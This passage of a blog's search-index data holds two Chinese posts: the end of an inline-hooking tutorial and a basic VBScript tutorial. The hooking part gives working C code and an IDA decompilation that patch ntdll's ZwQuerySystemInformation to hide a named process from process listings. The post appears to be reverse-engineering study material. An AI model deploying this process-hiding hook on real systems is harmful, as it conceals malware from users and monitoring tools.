JMP指令，它是用来进行短距离跳转的指令，对应的IA-32指令为”EB XX”（指令长度为2字节）。\n像上面这样每次使用JMP指令都要计算相对地址，显得不太方便。也可以使用其他指令直接用绝对地址跳转，但是这样的指令长度往往较为复杂。\n例（1）PUSH + RET\n68 00401000 PUSH 00401000\nC3 RETN\n例（2）MOV + JMP\nB8 00401000 MOV EAX,00401000\nFFE0 JMP EAX\nunhook_by_code()该函数用来取消钩取\n12345678910111213141516171819202122232425BOOL unhook_by_code(LPCSTR szDllName, LPCSTR szFuncName, PBYTE pOrgBytes)&#123;    FARPROC pFunc;    DWORD dwOldProtect;    PBYTE pByte;    //获取API地址    pFunc = GetProcAddress(GetModuleHandleA(szDllName), szFuncName);    pByte = (PBYTE)pFunc;    //若已经脱钩则return FALSE    if( pByte[0] != 0xE9 )        return FALSE;    // 向内存添加写属性，为恢复原代码（5个字节）准备    VirtualProtect((LPVOID)pFunc, 5, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);    // Unhook    memcpy(pFunc, pOrgBytes, 5);    //恢复内存属性    VirtualProtect((LPVOID)pFunc, 5, dwOldProtect, &amp;dwOldProtect);    return TRUE;&#125;\n\n脱钩的原理很简单，就是将函数代码开始的前5个字节恢复原值\nNewZwQuerySystemInformation()最后，分析钩取函数NewZwQuerySystemInformation()。在此之前，先看看ntdll.ZwQuerySystemInformation API\n12345678910111213141516171819202122NTSTATUS WINAPI ZwQuerySystemInformation(  _In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,  _Inout_   PVOID                    SystemInformation,  _In_      ULONG                    SystemInformationLength,  _Out_opt_ PULONG                   ReturnLength);typedef struct _SYSTEM_PROCESS_INFORMATION &#123;    ULONG NextEntryOffset;    ULONG NumberOfThreads;    BYTE Reserved1[48];    PVOID Reserved2[3];    HANDLE UniqueProcessId;    PVOID Reserved3;    ULONG HandleCount;    BYTE Reserved4[4];    PVOID Reserved5[11];    SIZE_T PeakPagefileUsage;    SIZE_T PrivatePageCount;    LARGE_INTEGER Reserved6[6];&#125; SYSTEM_PROCESS_INFORMATION,*PSYSTEM_PROCESS_INFORMATION;\n\n将SystemInformationClass设置为5（SystemProcessInformation）后调用ZwQuerySystemInformation() API，SystemInformation参数中存储的是SYSTEM_PROCESS_INFORMATION结构体单项链表的起始地址。该结构体链表中存储着运行中的所有进程信息。所以隐藏进程前，先要查找与之对应的链表成员，然后断开其与链表的链接。\n下面是NewZwQuerySystemInformation()函数的实现\n12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667NTSTATUS WINAPI NewZwQuerySystemInformation(                SYSTEM_INFORMATION_CLASS SystemInformationClass,                 PVOID SystemInformation,                 ULONG SystemInformationLength,                 PULONG ReturnLength)&#123;    NTSTATUS status;    FARPROC pFunc;    PSYSTEM_PROCESS_INFORMATION pCur, pPrev;    char szProcName[MAX_PATH] = &#123;0,&#125;;        //开始前先脱钩    unhook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION, g_pOrgBytes);    //调用原始API    pFunc = GetProcAddress(GetModuleHandleA(DEF_NTDLL),                            DEF_ZWQUERYSYSTEMINFORMATION);    status = ((PFZWQUERYSYSTEMINFORMATION)pFunc)              (SystemInformationClass, SystemInformation,               SystemInformationLength, ReturnLength);    if( status != STATUS_SUCCESS )        goto __NTQUERYSYSTEMINFORMATION_END;    //仅针对SystemProcessInformation类型操作    if( SystemInformationClass == SystemProcessInformation )    &#123;        // SYSTEM_PROCESS_INFORMATION类型转换        // pCur是单项链表的头        pCur = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;        while(TRUE)        &#123;            // 比较进程名称            // g_szProcName为要隐藏的进程名            // (=&gt; 在SetProcName()中设置)            if(pCur-&gt;Reserved2[1] != NULL)            &#123;                if(!_tcsicmp((PWSTR)pCur-&gt;Reserved2[1], g_szProcName))                &#123;                    //从链表中删除隐藏进程的节点                    if(pCur-&gt;NextEntryOffset == 0)                        pPrev-&gt;NextEntryOffset = 0;                    else                        pPrev-&gt;NextEntryOffset += pCur-&gt;NextEntryOffset;                &#125;                else\t\t                    pPrev = pCur;            &#125;            if(pCur-&gt;NextEntryOffset == 0)                break;            //链表的下一项            pCur = (PSYSTEM_PROCESS_INFORMATION)                    ((ULONG)pCur + pCur-&gt;NextEntryOffset);        &#125;    &#125;__NTQUERYSYSTEMINFORMATION_END:    //函数终止前，再次执行API钩取操作，为下次调用准备    hook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION,                  (PROC)NewZwQuerySystemInformation, g_pOrgBytes);    return status;&#125;\n\nIDA反编译结果：\n1234567891011121314151617181920212223242526272829303132333435363738394041int __stdcall sub_10001120(int a1, int a2, int a3, int a4)&#123;  int v4; // esi  HMODULE ModuleHandleA; // eax  FARPROC ZwQuerySystemInformation; // eax  int v7; // ebp  _DWORD *v8; // edi  _DWORD *v10; // [esp+10h] [ebp-10Ch]  CHAR MultiByteStr[260]; // [esp+14h] [ebp-108h] BYREF  v4 = a2;  memset(MultiByteStr, 0, sizeof(MultiByteStr));  sub_100010C0(&quot;ntdll.dll&quot;, &quot;ZwQuerySystemInformation&quot;, (int)&amp;unk_1000AC60);  ModuleHandleA = GetModuleHandleA(&quot;ntdll.dll&quot;);  ZwQuerySystemInformation = GetProcAddress(ModuleHandleA, &quot;ZwQuerySystemInformation&quot;);  v7 = ((int (__stdcall *)(int, int, int, int))ZwQuerySystemInformation)(a1, a2, a3, a4);  if ( !v7 &amp;&amp; a1 == 5 )  &#123;    v8 = v10;    while ( 1 )    &#123;      WideCharToMultiByte(0, 0, *(LPCWCH *)(v4 + 60), -1, MultiByteStr, 260, 0, 0);      if ( !_stricmp(MultiByteStr, Destination) )      &#123;        if ( *(_DWORD *)v4 )          *v8 += *(_DWORD *)v4;        else          *v8 = 0;      &#125;      else      &#123;        v8 = (_DWORD *)v4;      &#125;      if ( !*(_DWORD *)v4 )        break;      v4 += *(_DWORD *)v4;    &#125;  &#125;  sub_10001000(&quot;ntdll.dll&quot;, &quot;ZwQuerySystemInformation&quot;, (int)sub_10001120, (int)&amp;unk_1000AC60);  return v7;&#125;\n\n对NewZwQuerySystemInformation函数的结构说明如下：\n\n脱钩ZwQuerySystemInformation函数\n调用ZwQuerySystemInformation函数\n检查SYSTEM_PROCESS_INFORMATION结构体链表，查找要隐藏的进程\n查找到要隐藏的进程后，从链表中删除\n再次钩取ZwQuerySystemInformation\n\nNewZwQuerySystemInformation函数代码中有一个while语句，它用来检查SYSTEM_PROCESS_INFORMATION结构体链表，比较进程名称（pCur-&gt;Reserved2[1]）。\n参考链接https://blog.csdn.net/junbopengpeng/article/details/28142669\n","slug":"inline-Hook","date":"2022-03-24T09:39:13.000Z","categories_index":"","tags_index":"hook技术,逆向工程核心原理","author_index":"0netry"},{"id":"28df775ed85d265dbcba7f21d8f65afc","title":"VBScript教程","content":"VBScript 变量VBScript 变量VBScript 变量用于保存值或表达式。\n变量可以有一个短的名称，如 x，或一个更具描述性的名称，如 carname。\nVBScript 变量名称的规则：\n\n必须以字母开头\n不能包含点号（.）\n不能超过 255 个字符\n\n在 VBScript 中，所有的变量都与类型 variant 相关，可存储不同类型的数据。\n\n声明（创建）VBScript 变量在 VBScript 创建变量通常指”声明”变量。\n可以通过 Dim、Public 或 Private 语句声明 VBScript 变量。如下所示：\n12Dim xDim carname\n\n也可以在脚本中通过使用它的名称来声明变量。如下所示：\n1carname=&quot;Volvo&quot;\n\n现在又创建了一个变量。变量的名称是 “carname”。但是这个做法不是一个好习惯，因为可能会在脚本中拼错变量名，那样可能会在脚本运行时引起奇怪的结果。\n如果拼错变量名，比如 “carname” 变量错拼为 “carnime”，脚本会自动创建一个名为 “carnime” 的新变量。为了防止脚本这样做，可以使用 Option Explicit 语句。如果使用这个语句，就必须使用 dim、public 或 private 语句来声明所有的变量。\n把 Option Explicit 语句放置于脚本的顶端，如下所示：\n123Option ExplicitDim carnamecarname=some value\n\n\n\n\n为变量赋值可以为某个变量赋值，如下所示：\n12carname=&quot;Volvo&quot;x=10\n\n变量名是在表达式的左侧，需要赋给变量的值在表达式的右侧。现在变量 “carname” 的值是 “Volvo”，变量 “x” 的值是 “10”。\n\n变量的生存期变量的生存期指的是它可以存在的时长。\n当在一个子程序中声明变量时，变量只能在此程序内进行访问。当退出此程序时，变量也会失效。这样的变量称为本地变量。可以在不同的子程序中使用名称相同的本地变量，因为每个变量只能在声明它的程序内得到识别。\n如果在子程序以外声明了一个变量，在页面上的所有子程序都可以访问它。这类变量的生存期始于它们被声明，止于页面被关闭。\n\nVBScript 数组变量数组变量用于在一个单一的变量中存储多个值。\n在下面的实例中，声明了一个包含 3 个元素的数组：\n1Dim names(2)\n\n括号内显示的数字是 2。数组的下标以 0 开始，因此该数组包含 3 个元素。这是容量固定的数组。可以为数组的每个元素分配数据，如下所示：\n123names(0)=&quot;Tove&quot;names(1)=&quot;Jani&quot;names(2)=&quot;Stale&quot;\n\n同样地，通过使用特定数组元素的下标号，可以取回任何元素的值。如下所示：\n1mother=names(0)\n\n可以在一个数组中使用多达 60 个维数。声明多维数组的方法是在括号中用逗号来分隔数字。以下例子声明了一个包含 5 行 7 列的 2 维数组：\n1Dim table(4,6)\n\n为二维数组赋值：\n实例（仅适用于 IE）1234567891011121314151617181920212223242526&lt;html&gt;&lt;body&gt;&lt;script type=&quot;text/vbscript&quot;&gt;Dim x(2,2)x(0,0)=&quot;Volvo&quot;x(0,1)=&quot;BMW&quot;x(0,2)=&quot;Ford&quot;x(1,0)=&quot;Apple&quot;x(1,1)=&quot;Orange&quot;x(1,2)=&quot;Banana&quot;x(2,0)=&quot;Coke&quot;x(2,1)=&quot;Pepsi&quot;x(2,2)=&quot;Sprite&quot;for i=0 to 2document.write(&quot;&lt;p&gt;&quot;)for j=0 to 2document.write(x(i,j) &amp; &quot;&lt;br /&gt;&quot;)nextdocument.write(&quot;&lt;/p&gt;&quot;)next&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;\n\nVBScript 程序\nVBScript 可使用两种程序：\n\n子程序\n函数程序\n\n\nVBScript 子程序子程序：\n\n是一系列的语句，被封装在 Sub 和 End Sub 语句内\n可执行某些操作，但不会返回值\n可带有参数\n\n123Sub mysub()some statementsEnd Sub\n\n或者\n123Sub mysub(argument1,argument2)some statementsEnd Sub\n\n\n\n实例（仅适用于 IE）123Sub mysub()document.write(&quot;I was written by a sub procedure&quot;)End Sub\n\n\n\n\nVBScript 函数程序函数程序\n\n是一系列的语句，被封装在 Function 和 End Function 语句内\n可执行某些操作，并会返回值\n可带有通过程序调用来向其传递的参数。\n如果没有参数，必须带有空的圆括号 ()\n通过向函数程序名赋值的方式，可使其返回值\n\n1234Function myfunction()some statementsmyfunction=some valueEnd Function\n\n或者\n1234Function myfunction(argument1,argument2)some statementsmyfunction=some valueEnd Function\n\n\n\n实例（仅适用于 IE）123function myfunction()myfunction=Date()end function\n\n\n\n\n调用程序这个简单的函数程序被调用来计算两个参数的和：\n实例（仅适用于 IE）12345Function myfunction(a,b)myfunction=a+bEnd Functiondocument.write(myfunction(5,9))\n\n函数 “myfunction” 将返回参数 “a” 和参数 “b” 的和。这里返回的是 14。\n当调用程序时，可以使用 Call 语句，如下所示：\n1Call MyProc(argument)\n\n或者，可以省略 Call 语句，如下所示：\n1MyProc argument\n\nVBScript 条件语句\n条件语句条件语句用于根据不同的情况执行不同的操作。\n在 VBScript 中，可以使用四种条件语句：\n\nIf 语句 - 假如希望在条件为 true 时执行一系列的代码，可以使用这个语句\nIf…Then…Else 语句 - 假如希望执行两套代码其中之一，可以使用这个语句\nIf…Then…ElseIf 语句 - 假如希望选择多套代码之一来执行，可以使用这个语句\nSelect Case 语句 - 假如希望选择多套代码之一来执行，可以使用这个语句\n\n\nIf…Then…Else在下面的情况中，可以使用 If…Then…Else 语句：\n\n在条件为 true 时，执行某段代码\n选择两段代码之一来执行\n\n如果在条件为 true 时只执行一条语句，可以把代码写为一行：\n1If i=10 Then alert(&quot;Hello&quot;)\n\n在上面的代码中，没有 ..Else.. 语句。我们仅仅让代码在条件为 true 时（当 i&#x3D;10 时）执行一项操作。\n如果在条件为 true 时执行不止一条语句，那么就必须在一行写一条语句，然后使用关键词 “End If” 来结束这个语句：\n1234If i=10 Thenalert(&quot;Hello&quot;)i = i+1End If\n\n在上面的代码中，同样没有 ..Else.. 语句。我们仅仅让代码在条件为 true 时执行了多项操作。\n假如想要在条件为 true 时执行某条语句，并在条件不为 true 时执行另一条语句，就必须添加关键词 “Else”：\n实例（仅适用于 IE）12345678&lt;script type=&quot;text/vbscript&quot;&gt;i=hour(time)If i &lt; 10 Thendocument.write(&quot;Good morning!&quot;)Elsedocument.write(&quot;Have a nice day!&quot;)End If&lt;/script&gt;\n\n在上面的代码中，当条件为 true 时会执行第一段代码，当条件不成立时执行第二段代码（当 i 大于 10 时）。\n\nIf…Then…ElseIf如果想要选择多套代码之一来执行，可以使用 If…Then…ElseIf 语句：\n实例（仅适用于 IE）\n1234567891011121314&lt;script type=&quot;text/vbscript&quot;&gt;i=hour(time)If i = 10 Thendocument.write(&quot;Just started...!&quot;)ElseIf i = 11 Thendocument.write(&quot;Hungry!&quot;)ElseIf i = 12 Thendocument.write(&quot;Ah, lunch-time!&quot;)ElseIf i = 16 Thendocument.write(&quot;Time to go home!&quot;)Elsedocument.write(&quot;Unknown&quot;)End If&lt;/script&gt;\n\n\n\nSelect Case如果想要选择多套代码之一来执行，可以使用 “Select Case” 语句：\n实例（仅适用于 IE）12345678910111213141516171819&lt;script type=&quot;text/vbscript&quot;&gt;d=weekday(date)Select Case dCase 1document.write(&quot;Sleepy Sunday&quot;)Case 2document.write(&quot;Monday again!&quot;)Case 3document.write(&quot;Just Tuesday!&quot;)Case 4document.write(&quot;Wednesday!&quot;)Case 5document.write(&quot;Thursday...&quot;)Case 6document.write(&quot;Finally Friday!&quot;)Case elsedocument.write(&quot;Super Saturday!!!!&quot;)End Select&lt;/script&gt;\n\n以上代码的工作原理：首先，需要一个简单的表达式（常常是一个变量），并且这个表达式会被做一次求值运算。然后，表达式的值会与每个 Case 中的值作比较。如果匹配，被匹配的 Case 所对应的代码会被执行。\nVBScript 循环\n循环语句循环语句用于运行相同的代码块指定的次数。\n在 VBScript 中，可以使用四种循环语句：\n\nFor…Next 语句 - 运行一段代码指定的次数\nFor Each…Next 语句 - 针对集合中的每个项目或者数组中的每个元素来运行某段代码\nDo…Loop 语句 - 运行循环，当条件为 true 或者直到条件为 true 时\nWhile…Wend 语句 - 不要使用这个语句 - 请使用 Do…Loop 语句代替它\n\n\nFor…Next 循环请使用 For…Next 语句运行一段代码指定的次数。\nFor 语句规定计数变量（i）以及它的初始值和结束值。Next 语句会以 1 作为步进值来递增变量（i）。\n实例1234567891011&lt;html&gt;&lt;body&gt;&lt;script type=&quot;text/vbscript&quot;&gt;For i = 0 To 5document.write(&quot;The number is &quot; &amp; i &amp; &quot;&lt;br /&gt;&quot;)Next&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;\n\nStep 关键词通过 Step 关键词，可以规定计数变量递增或递减的步进值。\n在下面的实例中，计数变量（i）每次循环的递增步进值为 2。\n123For i=2 To 10 Step 2some codeNext\n\n如果要递减计数变量，就必须使用负的 Step 值。并且必须规定小于开始值的结束值。\n在下面的实例中，计数变量（i）每次循环的递减步进值为 2。\n123For i=10 To 2 Step -2some codeNext\n\n退出 For…Next可以通过 Exit For 关键词退出 For…Next 语句。\n1234For i=1 To 10If i=5 Then Exit Forsome codeNext\n\n\nFor Each…Next 循环For Each…Next 针对集合中的每个项目或者数组中的每个元素来重复运行某段代码。\n实例12345678910111213141516&lt;html&gt;&lt;body&gt;&lt;script type=&quot;text/vbscript&quot;&gt;Dim cars(2)cars(0)=&quot;Volvo&quot;cars(1)=&quot;Saab&quot;cars(2)=&quot;BMW&quot;For Each x In carsdocument.write(x &amp; &quot;&lt;br /&gt;&quot;)Next&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;\n\n\nDo…Loop如果不知道重复多少次，可以使用 Do…Loop 语句。\nDo…Loop 语句重复执行某段代码直到条件是 true 或条件变成 true。\n重复执行代码直到条件是 true可以使用 While 关键字来检查 Do… Loop 语句的条件。\n123Do While i&gt;10some codeLoop\n\n如果 i 等于 9，上述循环内的代码将终止执行。\n123Dosome codeLoop While i&gt;10\n\n这个循环内的代码将被执行至少一次，即使 i 小于 10。\n重复执行代码直到条件变成 true可以使用 Until 关键字来检查 Do…Loop 语句的条件。\n123Do Until i=10some codeLoop\n\n如果 i 等于 10，上述循环内的代码将终止执行。\n123Dosome codeLoop Until i=10\n\n这个循环内的代码将被执行至少一次，即使 i 等于 10。\n退出 Do…Loop可以通过 Exit Do 关键词退出 Do…Loop 语句。\n1234Do Until i=10i=i-1If i&lt;10 Then Exit DoLoop\n\n这个循环内的代码，只要 i 不为 10 且 i 大于 10 时都将被执行。\n","slug":"VBScript教程","date":"2022-03-15T14:05:53.000Z","categories_index":"编程","tags_index":"编程,VBScript","author_index":"0netry"}]